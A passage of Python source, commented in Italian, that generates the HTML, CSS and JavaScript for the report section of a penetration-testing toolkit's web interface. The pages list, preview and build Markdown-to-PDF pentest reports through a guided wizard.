    document.querySelectorAll('.fp-birth').forEach(function(el){
      if(!el.dataset.slashed){el.dataset.slashed='1';autoSlashDate(el);}
    });
  });
  obs.observe(document.body,{childList:true,subtree:true});

  document.addEventListener('keydown',function(e){
    if(e.key!=='Enter')return;
    var t=e.target;
    if(t.tagName!=='INPUT'||t.type==='checkbox'||t.type==='radio')return;
    e.preventDefault();
    var form=document.getElementById('burp-form');
    if(!form)return;
    var inputs=Array.from(form.querySelectorAll('input:not([type=checkbox]):not([type=radio]):not([type=hidden]),select,textarea'));
    var idx=inputs.indexOf(t);
    if(idx>=0&&idx<inputs.length-1){inputs[idx+1].focus();}
  });
})();
</script>
"""
    return _base_html("BURP", body, active="burp")


# ---------------------------------------------------------------------------
# Report — pagine SLWeb
# ---------------------------------------------------------------------------

def _report_sev_css() -> str:
    return """
.sev{padding:1px 8px;border-radius:4px;font-size:11px;font-weight:700;white-space:nowrap}
.sev-critical{background:rgba(248,81,73,.18);color:#ff7b72;border:1px solid rgba(248,81,73,.4)}
.sev-high{background:rgba(248,81,73,.12);color:#f85149;border:1px solid rgba(248,81,73,.35)}
.sev-medium{background:rgba(210,153,34,.12);color:#d29922;border:1px solid rgba(210,153,34,.35)}
.sev-low{background:rgba(88,166,255,.12);color:#58a6ff;border:1px solid rgba(88,166,255,.35)}
.sev-info{background:rgba(63,185,80,.12);color:#3fb950;border:1px solid rgba(63,185,80,.35)}
.report-section{border:1px solid var(--border);border-radius:8px;padding:18px 20px;margin-bottom:20px;background:var(--surface)}
.report-section-title{font-size:14px;font-weight:700;color:var(--accent);margin-bottom:12px}
.report-field{display:flex;gap:8px;margin-bottom:10px;align-items:center}
.report-field label{width:130px;flex-shrink:0;color:var(--text2);font-size:13px}
.report-field input[type="text"]{flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-family:inherit;font-size:13px;outline:none}
.report-field input:focus{border-color:var(--accent)}
.report-row{display:flex;align-items:center;gap:10px;padding:10px 12px;border:1px solid var(--border);border-radius:6px;margin-bottom:8px;background:var(--bg);flex-wrap:wrap}
.report-row .rname{font-weight:700;color:var(--text)}
.report-row .rclient{color:var(--text2);font-size:12px;flex:1;min-width:120px}
.report-row .tag{font-size:11px;padding:1px 8px;border-radius:4px;border:1px solid var(--border);color:var(--text2)}
.report-row .tag.pdf{color:var(--green);border-color:rgba(63,185,80,.4)}
.report-msg{margin-top:10px;font-size:13px;min-height:18px}
.report-msg.ok{color:var(--green)}
.report-msg.err{color:var(--red)}
.report-preview{--rpc:#0F4068;--rpc2:#2D5F8A;--rpdark:#0F2A44;--rpborder:#D5DEE8;--rpbg:#E9F0F7;--rpzebra:#F3F6FA;border:1px solid var(--border);border-radius:8px;background:#fff;color:#1a1a1a;padding:16px 20px;max-height:600px;overflow-y:auto;font-family:Georgia,'Times New Roman',serif;font-size:13px;line-height:1.45}
.report-preview h1,.report-preview h2,.report-preview h3{color:var(--rpc);font-family:'Segoe UI',Arial,sans-serif;margin:12px 0 6px}
.report-preview h1{font-size:18px;border-bottom:2px solid var(--rpc);padding-bottom:3px}
.report-preview h2{font-size:15px}
.report-preview h3{font-size:13px;color:var(--rpc2)}
.report-preview p{margin:0 0 6px}
.report-preview a{color:var(--rpc2)}
.report-preview strong{color:var(--rpdark)}
.report-preview table{border-collapse:collapse;width:100%;margin:6px 0;font-size:11px}
.report-preview th,.report-preview td{border:1px solid var(--rpborder);padding:3px 6px;text-align:left;vertical-align:top}
.report-preview th{background:var(--rpc);color:#fff;font-family:'Segoe UI',Arial,sans-serif}
.report-preview tr:nth-child(even) td{background:var(--rpzebra)}
.report-preview code{background:var(--rpbg);padding:1px 4px;border-radius:3px;font-size:11px;color:#b03a48}
.report-preview pre{background:#f4f6f8;border:1px solid var(--rpborder);border-left:3px solid var(--rpc);border-radius:5px;padding:6px 10px;overflow-x:auto;margin:6px 0;font-size:11px}
.report-preview pre code{background:none;color:#333;padding:0}
.report-preview blockquote{border-left:3px solid var(--rpc);margin:8px 0;padding:2px 12px;color:#555;background:#f7f9fb}
.report-preview img{max-width:100%}
.report-preview hr{border:none;border-top:1px dashed var(--rpborder);margin:10px 0}
.report-preview .sev-critical{background:#b91c1c;color:#fff;border:none}
.report-preview .sev-high{background:#dc2626;color:#fff;border:none}
.report-preview .sev-medium{background:#d97706;color:#fff;border:none}
.report-preview .sev-low{background:#2563eb;color:#fff;border:none}
.report-preview .sev-info{background:#059669;color:#fff;border:none}
.report-preview .fcard{border:1px solid var(--rpborder);border-left:3px solid var(--rpc);border-radius:6px;margin:8px 0;font-family:'Segoe UI',Arial,sans-serif;font-size:11.5px;overflow:hidden}
.report-preview .frow{display:flex;border-bottom:1px solid var(--rpborder)}
.report-preview .frow:last-child{border-bottom:none}
.report-preview .frow:nth-child(even){background:var(--rpzebra)}
.report-preview .fk{width:140px;flex-shrink:0;background:var(--rpc);color:#fff;font-weight:700;padding:4px 8px}
.report-preview .frow:nth-child(even) .fk{background:var(--rpc)}
.report-preview .fv{padding:4px 8px;flex:1;min-width:0;word-wrap:break-word}
.report-preview figure{margin:8px 0;text-align:center}
.report-preview figcaption{font-style:italic;font-size:11px;color:#5A6B7C;margin-top:3px}
.rp-cover{position:relative;background:linear-gradient(160deg,#fdfdff 60%,var(--rpbg));border:1px solid var(--rpborder);border-radius:6px;padding:36px 28px 60px;margin-bottom:18px;text-align:center;font-family:'Segoe UI',Arial,sans-serif}
.rp-cover-client{display:inline-block;background:var(--rpbg);color:var(--rpc);padding:8px 22px;font-size:14px;font-weight:700;letter-spacing:3px;text-transform:uppercase}
.rp-cover-title{margin-top:22px;font-size:19px;font-weight:700;color:var(--rpc);line-height:1.5}
.rp-cover-meta{position:absolute;bottom:26px;right:20px;text-align:right;font-size:11px;color:#44576B}
.rp-cover-meta strong{color:var(--rpc);font-size:12px}
.rp-cover-foot{position:absolute;bottom:0;left:0;right:0;border-top:1px dotted var(--rpborder);padding:5px;font-size:9px;color:#5A6B7C}
.rp-cover-foot strong{color:var(--rpc)}
.report-cmd{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px 14px;font-size:13px;margin:6px 0}
.report-cmd .c{color:var(--accent)}
.msf-result{border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-bottom:6px;background:var(--bg);font-size:12px}
.msf-result .msf-name{font-weight:700;color:var(--text)}
.msf-result .msf-desc{color:var(--text2);margin-top:2px}
.msf-result .msf-cve{color:var(--accent);font-family:monospace}
.fimg-row{display:flex;gap:8px;align-items:center;margin-bottom:6px;font-size:12px}
.fimg-row .fimg-path{color:var(--text2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
"""


# Pre-processing Markdown per le anteprime SLWeb: riproduce pandoc
# (rimuove fenced divs :::, converte le caption ": Tabella N:", nasconde
# le sezioni rimaste vuote, riscrive i path delle immagini verso le rotte SLWeb).
_JS_REPORT_PREPROCESS = r"""
function preprocessReportMd(md){
  md = md.replace(/^---[\s\S]*?---\n/, '');
  md = md.replace(/\{\{[A-Z_]+\}\}/g, '');
  // card finding ::: {.finding} -> tabella compatta HTML
  md = md.replace(/^[ \t]*:::[ \t]*\{\.finding\}[ \t]*\n([\s\S]*?)^[ \t]*:::[ \t]*$/gm,
    function(m, inner){
      var rows = [];
      inner.split('\n').forEach(function(l){
        var mm = /^\|\s*\*\*([^*]+)\*\*\s*\|\s*([\s\S]*?)\s*\|\s*$/.exec(l);
        if (mm){
          var v = (typeof marked !== 'undefined') ? marked.parseInline(mm[2]) : mm[2];
          rows.push('<div class="frow"><span class="fk">'+mm[1]+'</span><span class="fv">'+v+'</span></div>');
        }
      });
      return '\n\n<div class="fcard">'+rows.join('')+'</div>\n\n';
    });
  md = md.replace(/^\s*:::.*$/gm, '');
  md = md.replace(/^:[ \t]+((?:Tabella|Figura)\b[^\n]*)$/gm, '\n*$1*\n');
  md = md.replace(/\]\(reports\/([^)\/]+)\/evidence\/([^)\s]+)\)/g, '](/report/img/$1/$2)');
  md = md.replace(/src="reports\/([^\/"]+)\/evidence\//g, 'src="/report/img/$1/');
  md = md.replace(/src="report\/assets\//g, 'src="/report-assets/');
  var fm = /<!--\s*@@AUTO:firma@@\s*-->([\s\S]*?)<!--\s*@@\/AUTO:firma@@\s*-->/.exec(md);
  var firma = '';
  if (fm && fm[1].replace(/<!--[\s\S]*?-->/g, '').trim()){ firma = '\n\n' + fm[0]; md = md.replace(fm[0], ''); }
  md = md.replace(/<!--\s*@@(SEZ|AUTO):[a-z_]+@@\s*-->([\s\S]*?)<!--\s*@@\/\1:[a-z_]+@@\s*-->/g,
    function(m, kind, inner){
      var t = inner.replace(/<!--[\s\S]*?-->/g, '').replace(/\*—\*/g, '').trim();
      return t ? m : '';
    });
  for (var pass = 0; pass < 20; pass++){
    var lines = md.split('\n'), heads = [], inCode = false, m2;
    for (var i = 0; i < lines.length; i++){
      if (/^\s*(```|~~~)/.test(lines[i])) inCode = !inCode;
      else if (!inCode && (m2 = /^(#{1,6})\s/.exec(lines[i]))) heads.push([i, m2[1].length]);
    }
    var removed = false;
    for (var h = heads.length - 1; h >= 0; h--){
      var li = heads[h][0], lvl = heads[h][1], end = lines.length;
      for (var j = h + 1; j < heads.length; j++){ if (heads[j][1] <= lvl){ end = heads[j][0]; break; } }
      var body = lines.slice(li + 1, end).join('\n').replace(/<!--[\s\S]*?-->/g, '').replace(/\*—\*/g, '').trim();
      if (!body){ lines.splice(li, end - li); md = lines.join('\n'); removed = true; break; }
    }
    if (!removed) break;
  }
  md = md.replace(/\n{3,}/g, '\n\n');
  return md + firma;
}
"""


# Editor Markdown "vero" (textarea con syntax highlight sovrapposto, scorciatoie
# da tastiera, status bar) — nessuna dipendenza esterna, funziona offline.
_JS_MD_EDITOR = r"""
function _mdHlEsc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function mdHighlight(src){
  var lines = src.split('\n'), out = [], inFence = false, inCom = false;
  for (var i = 0; i < lines.length; i++){
    var raw = lines[i], l = _mdHlEsc(raw);
    if (inFence){
      out.push('<span class="tk-fence">' + l + '</span>');
      if (/^\s*```/.test(raw)) inFence = false;
      continue;
    }
    if (/^\s*```/.test(raw)){ inFence = true; out.push('<span class="tk-fence">' + l + '</span>'); continue; }
    if (inCom){
      out.push('<span class="tk-com">' + l + '</span>');
      if (raw.indexOf('-->') >= 0) inCom = false;
      continue;
    }
    if (/^\s*<!--/.test(raw) && raw.indexOf('-->') < 0){ inCom = true; out.push('<span class="tk-com">' + l + '</span>'); continue; }
    l = l.replace(/(`+)([^`]*?)\1/g, '<span class="tk-code">$1$2$1</span>');
    l = l.replace(/!\[([^\]]*)\]\(([^)]*)\)/g, '<span class="tk-link">![$1]($2)</span>');
    l = l.replace(/\[([^\]]+)\]\(([^)]*)\)/g, '<span class="tk-link">[$1]($2)</span>');
    l = l.replace(/\*\*([^*]+)\*\*/g, '<span class="tk-b">**$1**</span>');
    l = l.replace(/(^|[^*])\*([^*\n]+)\*(?!\*)/g, '$1<span class="tk-i">*$2*</span>');
    if (/^\s*<!--/.test(raw)) l = '<span class="tk-com">' + l + '</span>';
    else if (/^\s*#{1,6}\s/.test(raw)) l = '<span class="tk-h">' + l + '</span>';
    else if (/^\s*(\|.*\|)\s*$/.test(raw)) l = '<span class="tk-tbl">' + l + '</span>';
    else if (/^\s*([-*+]|\d+\.)\s/.test(raw)) l = l.replace(/^(\s*)([-*+]|\d+\.)/, '$1<span class="tk-list">$2</span>');
    else if (/^\s*:\s+(Tabella|Figura)/.test(raw)) l = '<span class="tk-cap">' + l + '</span>';
    else if (/^\s*(---|\*\*\*|___)\s*$/.test(raw)) l = '<span class="tk-h">' + l + '</span>';
    out.push(l);
  }
  return out.join('\n');
}
function mdSyncScroll(){
  var ta = document.getElementById('w-md'), hl = document.getElementById('w-md-hl');
  if (!ta || !hl) return;
  hl.scrollTop = ta.scrollTop; hl.scrollLeft = ta.scrollLeft;
}
function mdStatus(){
  var ta = document.getElementById('w-md'), st = document.getElementById('w-md-status');
  if (!ta || !st) return;
  var pos = ta.selectionStart || 0, upto = ta.value.substring(0, pos);
  var line = upto.split('\n').length, col = pos - upto.lastIndexOf('\n');
  st.textContent = 'Riga ' + line + ', Col ' + col + ' · ' + ta.value.length + ' caratteri';
}
function mdSyncEditor(){
  var ta = document.getElementById('w-md'), code = document.getElementById('w-md-code');
  if (!ta || !code) return;
  code.innerHTML = mdHighlight(ta.value) + '\n';
  mdSyncScroll(); mdStatus();
}
function mdKeydown(e){
  var ta = e.target;
  if (e.key === 'Tab'){
    e.preventDefault();
    var s = ta.selectionStart;
    ta.value = ta.value.substring(0, s) + '  ' + ta.value.substring(ta.selectionEnd);
    ta.selectionStart = ta.selectionEnd = s + 2;
    mdSyncEditor(); schedulePreview();
  } else if (e.key === 'Enter'){
    var s2 = ta.selectionStart, upto = ta.value.substring(0, s2);
    var cur = upto.substring(upto.lastIndexOf('\n') + 1);
    var m = /^(\s*)([-*+]|\d+\.)\s+/.exec(cur);
    if (m){
      e.preventDefault();
      var marker = m[2];
      if (cur.trim() === marker){
        var ns = s2 - cur.length;
        ta.value = ta.value.substring(0, ns) + '\n' + ta.value.substring(s2);
        ta.selectionStart = ta.selectionEnd = ns + 1;
      } else {
        var next = /\d+\./.test(marker) ? (parseInt(marker, 10) + 1) + '.' : marker;
        var ins = '\n' + m[1] + next + ' ';
        ta.value = ta.value.substring(0, s2) + ins + ta.value.substring(ta.selectionEnd);
        ta.selectionStart = ta.selectionEnd = s2 + ins.length;
      }
      mdSyncEditor(); schedulePreview();
    }
  } else if ((e.ctrlKey || e.metaKey) && !e.shiftKey){
    var k = e.key.toLowerCase();
    if (k === 'b'){ e.preventDefault(); mdInsert('w-md', '**', '**', 'grassetto'); }
    else if (k === 'i'){ e.preventDefault(); mdInsert('w-md', '*', '*', 'corsivo'); }
    else if (k === 'e'){ e.preventDefault(); mdInsert('w-md', '`', '`', 'comando'); }
    else if (k === 'k'){ e.preventDefault(); mdInsert('w-md', '[', '](https://)', 'testo link'); }
  }
}
"""


# Stile live per le anteprime: applica i colori scelti (sezione Stile) e
# genera la copertina sopra l'anteprima.
_JS_REPORT_STYLE = r"""
function _rpEsc(s){ var d = document.createElement('div'); d.textContent = s || ''; return d.innerHTML; }
function _rpShade(hex, d){
  hex = (hex || '#0F4068').replace('#', '');
  if (hex.length === 3) hex = hex.replace(/./g, '$&$&');
  var r = parseInt(hex.substr(0,2),16)/255, g = parseInt(hex.substr(2,2),16)/255, b = parseInt(hex.substr(4,2),16)/255;
  var mx = Math.max(r,g,b), mn = Math.min(r,g,b), l = (mx+mn)/2, h = 0, s = 0;
  if (mx !== mn){
    var dd = mx-mn;
    s = l > 0.5 ? dd/(2-mx-mn) : dd/(mx+mn);
    if (mx === r) h = (g-b)/dd + (g < b ? 6 : 0);
    else if (mx === g) h = (b-r)/dd + 2;
    else h = (r-g)/dd + 4;
    h /= 6;
  }
  l = Math.min(1, Math.max(0, l + d));
  function hue(p, q, t){ if(t<0)t+=1; if(t>1)t-=1; if(t<1/6)return p+(q-p)*6*t; if(t<1/2)return q; if(t<2/3)return p+(q-p)*(2/3-t)*6; return p; }
  var q = l < 0.5 ? l*(1+s) : l+s-l*s, p = 2*l-q;
  r = hue(p,q,h+1/3); g = hue(p,q,h); b = hue(p,q,h-1/3);
  function tc(x){ return ('0'+Math.round(x*255).toString(16)).slice(-2); }
  return '#'+tc(r)+tc(g)+tc(b);
}
var _RP_PRESETS = {navy:'#0F4068', red:'#8B1A1A', black:'#1F2429', green:'#1E5B38', yellow:'#8A6200'};
function reportColors(meta){
  var st = (meta && meta.style) || {};
  var c1 = (st.preset === 'custom' && st.color) ? st.color : (_RP_PRESETS[st.preset] || _RP_PRESETS.navy);
  var c2 = st.color2 || _rpShade(c1, 0.12);
  return {c1: c1, c2: c2};
}
function applyReportStyleTo(el, meta){
  var c = reportColors(meta);
  el.style.setProperty('--rpc', c.c1);
  el.style.setProperty('--rpc2', c.c2);
  el.style.setProperty('--rpdark', _rpShade(c.c1, -0.12));
  el.style.setProperty('--rpborder', _rpShade(c.c1, 0.66));
  el.style.setProperty('--rpbg', _rpShade(c.c1, 0.84));
  el.style.setProperty('--rpzebra', _rpShade(c.c1, 0.9));
}
function reportCoverHtml(meta){
  var m = meta || {}, st = m.style || {};
  var logo = (st.logo || '').replace(/^reports\/([^\/]+)\/evidence\//, '/report/img/$1/');
  var company = st.company || 'SLCtrl';
  var date = m.date_end || m.date_start || '';
  return '<div class="rp-cover">'+
    (logo ? '<img src="'+logo+'" style="max-width:150px;max-height:70px;margin-bottom:14px">' : '')+
    '<div class="rp-cover-client">'+_rpEsc(m.client || 'Cliente')+'</div>'+
    '<div class="rp-cover-title">'+_rpEsc(m.rtype || 'Penetration Test')+'<br>'+
    '<span style="font-size:13px;font-weight:400">Report Finale</span></div>'+
    '<div class="rp-cover-meta"><strong>'+_rpEsc(m.client || '')+'</strong><br>'+
    (st.author ? 'Redatto da: '+_rpEsc(st.author)+'<br>' : '')+
    (date ? _rpEsc(date)+'<br>' : '')+'<em>Versione 1.0</em></div>'+
    '<div class="rp-cover-foot"><strong>'+_rpEsc(company)+' — Riservato</strong> · '+
    'Nessuna parte di questo documento può essere divulgata a soggetti esterni</div></div>';
}
"""


def _page_report() -> str:
    from lib.report import list_reports, TEMPLATE_MD
    reports = list_reports()

    rows = ""
    from lib.report import BOX_LABEL
    for r in reports:
        slug = html.escape(r["slug"])
        client = html.escape(r["client"] or r["slug"])
        pdf_tag = '<span class="tag pdf">PDF pronto</span>' if r["pdf"] else '<span class="tag">nessun PDF</span>'
        ev_tag = f'<span class="tag">{r["evidence"]} evidenze</span>' if r["evidence"] else ""
        box_tag = f'<span class="tag">{html.escape(BOX_LABEL.get(r["box"], ""))}</span>' if r["box"] else ""
        f_tag = f'<span class="tag">{r["n_findings"]} finding</span>' if r["n_findings"] else ""
        pdf_btn = f'<a class="btn" href="/report/pdf/{slug}" target="_blank">PDF</a>' if r["pdf"] else ""
        rows += f"""<div class="report-row" data-slug="{slug}">
<span class="rname">{slug}</span><span class="rclient">{client}</span>{box_tag}{f_tag}{pdf_tag}{ev_tag}
<a class="btn btn-primary" href="/report/wizard/{slug}">Compila</a>
<a class="btn" href="/report/view/{slug}">Anteprima</a>
{pdf_btn}
<button class="btn" onclick="buildReport('{slug}',this)">Build PDF</button>
<button class="btn btn-danger" onclick="deleteReport('{slug}')">Elimina</button>
</div>"""
    if not rows:
        rows = '<p style="color:var(--text2);padding:8px 0">Nessun report ancora. Creane uno dal form qui sopra &mdash; oppure da console con <code>report new "Cliente"</code>.</p>'

    try:
        template_md = TEMPLATE_MD.read_text(encoding="utf-8", errors="replace")
    except OSError:
        template_md = "# Template non trovato"
    safe_md = (template_md.replace("\\", "\\\\").replace("`", "\\`")
               .replace("$", "\\$").replace("</", "<\\/"))

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Report</div>
<div class="page-title">Report</div>
<div class="page-sub">Report di penetration test in Markdown &rarr; PDF (template SLCtrl)</div>
<style>{_report_sev_css()}</style>

<div class="report-section">
  <div class="report-section-title">Come funziona</div>
  <p style="font-size:13px;color:var(--text2);margin-bottom:8px">
  Un <strong style="color:var(--text)">report</strong> &egrave; il documento finale del tuo penetration test:
  executive summary, walkthrough della compromissione, finding con severit&agrave; e remediation.
  Lo scrivi in <strong style="color:var(--text)">Markdown</strong> partendo dal template SLCtrl e lo compili in
  <strong style="color:var(--text)">PDF</strong> con un click (pandoc + weasyprint).</p>
  <div class="report-cmd">$ <span class="c">report new "Acme Corp"</span>&nbsp;&nbsp;<span style="color:var(--text2)"># crea il report</span></div>
  <div class="report-cmd">$ <span class="c">report edit acme-corp</span>&nbsp;&nbsp;<span style="color:var(--text2)"># lo apre in VS Code per editarlo</span></div>
  <div class="report-cmd">$ <span class="c">report build acme-corp</span>&nbsp;&nbsp;<span style="color:var(--text2)"># genera il PDF finale</span></div>
  <p style="font-size:12px;color:var(--text2);margin-top:8px">Gli screenshot vanno in <code>reports/&lt;cliente&gt;/evidence/</code>.
  Severit&agrave;: <span class="sev sev-critical">Critica</span> <span class="sev sev-high">Alta</span>
  <span class="sev sev-medium">Media</span> <span class="sev sev-low">Bassa</span> <span class="sev sev-info">Info</span></p>
  <p style="font-size:12px;color:var(--text2);margin-top:6px">I finding possono essere cercati nel
  <strong style="color:var(--text)">db locale di Metasploit</strong> (CVE e moduli, tutto offline — nessuna chiamata a Internet):
  il wizard precompila titolo, descrizione, severit&agrave; e riferimenti.
  Le sezioni lasciate vuote nel wizard <strong style="color:var(--text)">non compaiono nel PDF</strong> (n&eacute; titoli n&eacute; spazi).
  Dalla sezione <strong style="color:var(--text)">Stile</strong> del wizard gestisci colori del report, logo, autore, azienda e firma.</p>
</div>

<div class="report-section">
  <div class="report-section-title">Nuovo report</div>
  <div class="report-field"><label>Cliente *</label><input type="text" id="r-client" placeholder='es. Acme Corp'></div>
  <div class="report-field"><label>Tipo di test</label><input type="text" id="r-type" placeholder="Penetration Test Interno"></div>
  <div class="report-field"><label>Tipo di box</label>
    <select id="r-box" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-family:inherit;font-size:13px">
      <option value="black">Black box — nessuna conoscenza preliminare</option>
      <option value="grey">Grey box — conoscenza/credenziali parziali</option>
      <option value="white">White box — piena visibilità sull'ambiente</option>
    </select></div>
  <div class="report-field"><label>Dominio</label><input type="text" id="r-domain" placeholder="vuoto = derivato dal cliente (es. ACME.LOCAL)"></div>
  <button class="btn btn-primary" onclick="createReport()">+ Crea report</button>
  <span style="font-size:12px;color:var(--text2);margin-left:10px">poi compilalo sezione per sezione con il <strong>wizard</strong> (pulsante Compila)</span>
  <div class="report-msg" id="r-msg"></div>
</div>

<div class="report-section">
  <div class="report-section-title">I tuoi report ({len(reports)})</div>
  <div id="r-list">{rows}</div>
</div>

<div class="report-section">
  <div class="report-section-title">Anteprima del template</div>
  <p style="font-size:12px;color:var(--text2);margin-bottom:10px">Questo &egrave; il documento da cui parte ogni nuovo report (stile semplificato; il PDF finale usa il tema SLCtrl completo).</p>
  <div class="report-preview" id="r-preview"></div>
</div>
</div>
<script>
{_JS_REPORT_PREPROCESS}
{_JS_REPORT_STYLE}
var TEMPLATE_MD = `{safe_md}`;
var _rpEl = document.getElementById('r-preview');
_rpEl.innerHTML = reportCoverHtml({{client:'Nome Cliente', rtype:'Penetration Test Interno', date_end:'', style:{{}}}}) +
  marked.parse(preprocessReportMd(TEMPLATE_MD));
applyReportStyleTo(_rpEl, null);

function msg(t, ok) {{
  var el = document.getElementById('r-msg');
  el.textContent = t; el.className = 'report-msg ' + (ok ? 'ok' : 'err');
}}
function createReport() {{
  var client = document.getElementById('r-client').value.trim();
  var rtype = document.getElementById('r-type').value.trim();
  if (!client) {{ msg('Inserisci il nome del cliente.', false); return; }}
  fetch('/api/report/new', {{
    method: 'POST', headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{client: client, rtype: rtype,
                          box: document.getElementById('r-box').value,
                          domain: document.getElementById('r-domain').value.trim()}})
  }}).then(r => r.json()).then(d => {{
    if (d.ok) {{ msg('Report creato: ' + d.slug + ' — apro il wizard…', true); setTimeout(() => location.href = '/report/wizard/' + d.slug, 800); }}
    else msg(d.error || 'Errore', false);
  }}).catch(() => msg('Errore di rete', false));
}}
function buildReport(slug, btn) {{
  btn.disabled = true; btn.textContent = 'Build…';
  fetch('/api/report/build', {{
    method: 'POST', headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{slug: slug}})
  }}).then(r => r.json()).then(d => {{
    btn.disabled = false; btn.textContent = 'Build PDF';
    if (d.ok) {{ alert('PDF generato!'); location.reload(); }}
    else alert('Build fallito:\\n' + (d.error || 'errore'));
  }}).catch(() => {{ btn.disabled = false; btn.textContent = 'Build PDF'; alert('Errore di rete'); }});
}}
function deleteReport(slug) {{
  if (!confirm('Eliminare il report "' + slug + '"? (file .md, PDF ed evidenze)')) return;
  fetch('/api/report/delete', {{
    method: 'POST', headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{slug: slug}})
  }}).then(r => r.json()).then(d => {{
    if (d.ok) location.reload(); else alert(d.error || 'Errore');
  }}).catch(() => alert('Errore di rete'));
}}
</script>"""
    return _base_html("Report", body, active="report")


def _page_report_view(slug: str) -> str:
    from lib.report import find_report
    rep = find_report(slug)
    if rep is None:
        return _base_html("Report non trovato", '<div class="container"><div class="page-title">Report non trovato</div><p style="margin-top:12px"><a href="/report">Torna ai report</a></p></div>', active="report")
    md_text = Path(rep["md"]).read_text(encoding="utf-8", errors="replace")
    safe_md = (md_text.replace("\\", "\\\\").replace("`", "\\`")
               .replace("$", "\\$").replace("</", "<\\/"))
    title = html.escape(rep["client"] or rep["slug"])
    slug_e = html.escape(rep["slug"])
    pdf = rep["pdf"]
    pdf_btn = f'<a class="btn" href="/report/pdf/{slug_e}" target="_blank">Apri PDF</a>' if pdf else ""
    body = f"""<div class="container" style="max-width:1000px">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/report">Report</a> <span>/</span> {slug_e}</div>
<div class="page-title">{title}</div>
<div class="page-sub">Anteprima del report &mdash; modifica con <code>report edit {slug_e}</code> (VS Code)</div>
<style>{_report_sev_css()}</style>
<div class="btn-group">
<a class="btn" href="/report">← Tutti i report</a>
<a class="btn" href="/report/raw/{slug_e}">Scarica .md</a>
{pdf_btn}
<button class="btn btn-primary" onclick="buildReport('{slug_e}',this)">Build PDF</button>
</div>
<div class="report-preview" id="r-preview" style="max-height:none"></div>
</div>
<script>
{_JS_REPORT_PREPROCESS}
{_JS_REPORT_STYLE}
var MD = `{safe_md}`;
var _rpEl = document.getElementById('r-preview');
function renderView(meta) {{
  _rpEl.innerHTML = reportCoverHtml(meta) + marked.parse(preprocessReportMd(MD));
  applyReportStyleTo(_rpEl, meta);
}}
renderView({{client: '{title}', rtype: '', date_end: '', style: {{}}}});
fetch('/api/report/data?slug={slug_e}').then(r => r.json()).then(d => {{
  if (d.ok) renderView(d.meta);
}}).catch(() => {{}});
function buildReport(slug, btn) {{
  btn.disabled = true; btn.textContent = 'Build…';
  fetch('/api/report/build', {{
    method: 'POST', headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{slug: slug}})
  }}).then(r => r.json()).then(d => {{
    btn.disabled = false; btn.textContent = 'Build PDF';
    if (d.ok) {{ alert('PDF generato!'); location.reload(); }}
    else alert('Build fallito:\\n' + (d.error || 'errore'));
  }}).catch(() => {{ btn.disabled = false; btn.textContent = 'Build PDF'; alert('Errore di rete'); }});
}}
</script>"""
    return _base_html(title, body, active="report")



def _page_report_wizard(slug: str) -> str:
    """Wizard guidato: compila il report una sezione alla volta."""
    from lib.report import find_report
    rep = find_report(slug)
    if rep is None:
        return _base_html("Report non trovato", '<div class="container"><div class="page-title">Report non trovato</div><p style="margin-top:12px"><a href="/report">Torna ai report</a></p></div>', active="report")
    slug_e = html.escape(rep["slug"])
    client_e = html.escape(rep["client"] or rep["slug"])

    body = f"""<div class="container" style="max-width:1560px">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/report">Report</a> <span>/</span> {slug_e} <span>/</span> Wizard</div>
<div class="page-title">Wizard — {client_e}</div>
<div class="page-sub">Compila il report una sezione alla volta — l’anteprima a destra (copertina inclusa) si aggiorna in tempo reale con colori e stile scelti.</div>
<style>{_report_sev_css()}
.wiz-layout{{display:grid;grid-template-columns:150px minmax(0,1.15fr) minmax(0,1fr);gap:14px;margin-top:8px}}
.wiz-nav{{display:flex;flex-direction:column;gap:4px;min-width:0}}
.wiz-step-btn{{text-align:left;background:var(--surface);border:1px solid var(--border);color:var(--text2);padding:8px 10px;border-radius:6px;cursor:pointer;font-family:inherit;font-size:12.5px;display:flex;gap:7px;align-items:center;min-width:0}}
.wiz-step-btn span:last-child{{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}
.wiz-step-btn:hover{{border-color:var(--accent);color:var(--text)}}
.wiz-step-btn.active{{background:rgba(88,166,255,.1);border-color:var(--accent);color:var(--accent)}}
.wiz-step-btn.done .wiz-dot{{background:var(--green);color:var(--bg)}}
.wiz-dot{{width:20px;height:20px;border-radius:50%;background:var(--surface2);border:1px solid var(--border);display:inline-flex;align-items:center;justify-content:center;font-size:11px;flex-shrink:0}}
.wiz-panel{{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:20px;min-height:300px;min-width:0;overflow-wrap:break-word}}
.wiz-panel h3{{margin-bottom:4px;font-size:15px}}
.wiz-hint{{font-size:12px;color:var(--text2);margin-bottom:14px}}
.wiz-actions{{display:flex;justify-content:space-between;margin-top:18px}}
.wiz-side{{position:sticky;top:8px;align-self:start;min-width:0}}
.wiz-side-title{{font-size:12px;font-weight:700;color:var(--text2);margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}}
#wiz-preview{{max-height:82vh;font-size:12px}}
.wiz-field{{margin-bottom:12px;min-width:0}}
.wiz-field label{{display:block;font-size:12px;color:var(--text2);margin-bottom:4px;font-weight:600}}
.wiz-field input[type=text],.wiz-field select,.wiz-field textarea{{width:100%;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-family:inherit;font-size:13px;outline:none;box-sizing:border-box}}
.wiz-field textarea{{min-height:140px;resize:vertical}}
.wiz-field input:focus,.wiz-field select:focus,.wiz-field textarea:focus{{border-color:var(--accent)}}
.wiz-grid2{{display:grid;grid-template-columns:1fr 1fr;gap:12px}}
